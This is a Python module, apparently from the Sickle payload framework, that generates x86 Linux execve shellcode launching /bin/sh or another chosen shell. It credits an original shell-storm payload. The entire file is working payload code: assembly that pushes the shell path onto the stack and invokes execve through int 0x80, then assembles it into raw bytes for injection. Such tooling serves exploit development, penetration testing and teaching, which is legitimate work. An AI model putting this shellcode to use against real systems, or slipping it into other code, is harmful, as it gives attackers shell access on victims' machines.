import sys
import struct

from sickle.common.lib.generic import convert
from sickle.common.lib.generic import modparser
from sickle.common.lib.reversing import mappings

from sickle.common.lib.reversing.assembler import Assembler

class Shellcode():

    arch = "x86"

    platform = "linux"

    name = f"Linux ({arch}) Execve"

    module = f"{platform}/{arch}/execve"

    example_run = f"{sys.argv[0]} -p {module} -f c"

    ring = 3

    author = ["Jean Pascal Pereira <pereira@secbiz.de>", # Original author (https://shell-storm.org/shellcode/files/shellcode-811.html)
              "wetw0rk"]                                 # Sickle module

    tested_platforms = ["Ubuntu 16.04.1 LTS"]

    summary = ("Executes a shell session such as /bin/sh")

    description = ("Executes a shell session such as /bin/sh")

    arguments = {}
    arguments["EXEC"] = {}
    arguments["EXEC"]["optional"] = "yes"
    arguments["EXEC"]["description"] = "Shell environment (e.g /bin/bash)"

    def __init__(self, arg_object):

        self.arg_list = arg_object["positional arguments"]

        self.syscalls = mappings.get_linux_syscalls(["execve"])

        self.set_args()

    def set_args(self):
        """Configure the arguments that may be used by the shellcode stub
        """

        all_args = Shellcode.arguments
        argv_dict = modparser.argument_check(Shellcode.arguments, self.arg_list)
        if (argv_dict == None):
            exit(-1)

        if ("EXEC" not in argv_dict.keys()):
            self.cmd = "/bin/sh"
        else:
            self.cmd = argv_dict["EXEC"]

    def generate_source(self):
        """Returns assembly source code for the main functionality of the stub
        """

        src = f"""
start:
    xor    eax,eax
    push   eax
"""

        # Ensure that the shell string is able to be converted into DWORDS only
        cmd_string = self.cmd
        while (((len(cmd_string) % 8) != 0) or (len(cmd_string) < 4)):
            cmd_string = "/" + cmd_string

        # Generate PUSH operations to get the string onto the stack
        shell_buffer = convert.from_str_to_xwords(cmd_string, 0x04)
        push_ops = []
        for i in range(len(shell_buffer["DWORD_LIST"])):
            push_asm = "    push 0x{}\n".format( struct.pack('<L', shell_buffer["DWORD_LIST"][i]).hex() )
            push_ops.append(push_asm)

        # Write the string backwards
        for instruction in reversed(push_ops):
            src += instruction

        src += f"""
    mov    ebx, esp
    mov    ecx, eax
    mov    edx, eax
    mov    al, {self.syscalls['execve']}
    int    0x80
    ; exit(0)
    xor    eax,eax
    inc    eax
    int    0x80
        """

        return src

    def get_shellcode(self):
        """Generates Shellcode
        """

        generator = Assembler(Shellcode.arch)
        src = self.generate_source()

        shellcode = generator.get_bytes_from_asm(src)

        return shellcode
